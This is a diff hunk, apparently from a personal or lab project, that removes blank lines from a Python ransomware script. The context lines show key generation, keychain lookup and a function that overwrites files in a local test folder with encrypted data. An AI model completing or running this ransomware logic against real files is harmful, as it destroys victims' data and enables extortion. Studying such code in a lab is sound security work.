@@ -9,7 +9,6 @@ debug = 1
 mypath = "/home/daniel/git/cyber/ransomware/files_to_encrypt/"
 keychain_path = "/home/daniel/git/cyber/ransomware/keychain.txt"
 
-
 def get_key(): 
     return get_random_bytes(32)  # key generation
 
@@ -33,7 +32,6 @@ def extract_key_from_keychain(file):
 
     print("didnt find, sorry")
          
-
 def encrypt_files():
     global mypath
     global debug
@@ -56,7 +54,6 @@ def encrypt_files():
         with open(file, 'wb') as encrypted_file:   # opening the file in write mode and
             encrypted_file.write(encrypted)     # writing the encrypted data
             
-       
 def decrypt():     
     global mypath
     global key_size
